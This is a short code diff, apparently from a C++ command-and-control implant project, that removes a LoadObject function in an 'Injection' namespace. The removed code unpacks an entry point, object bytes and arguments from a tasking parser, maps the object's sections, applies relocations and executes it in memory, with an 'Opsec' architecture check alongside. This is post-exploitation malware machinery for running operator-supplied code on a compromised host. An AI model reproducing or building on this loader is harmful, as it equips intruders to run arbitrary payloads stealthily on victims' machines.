@@ -55,36 +55,6 @@ namespace Injection {
         }
     }
 
-    VOID LoadObject(_parser parser) {
-        HEXANE
-
-        char        *entrypoint = { };
-        uint8_t     *data       = { };
-        uint8_t     *args       = { };
-
-        uint32_t    arg_size    = 0;
-        uint32_t    req_id      = 0;
-        _executable object      = { };
-
-        entrypoint  = Parser::UnpackString(&parser, nullptr);
-        data        = Parser::UnpackBytes(&parser, nullptr);
-        args        = Parser::UnpackBytes(&parser, &arg_size);
-
-        Memory::Methods::CreateImageData(B_PTR(data));
-
-        object.next = Ctx->coffs;
-        Ctx->coffs  = &object;
-
-        x_assert(Opsec::ImageCheckArch(&object));
-        x_assert(Objects::MapSections(&object, data));
-        x_assert(Objects::BaseRelocation(&object));
-        x_assert(Memory::Execute::ExecuteObject(&object, entrypoint, R_CAST(char*, args), arg_size, req_id));
-
-    defer:
-        if (ntstatus != ERROR_SUCCESS) {
-            Ctx->nt.RtlFreeHeap(Ctx->heap, 0, &object);
-        }
-    }
 
     namespace Veh {
 
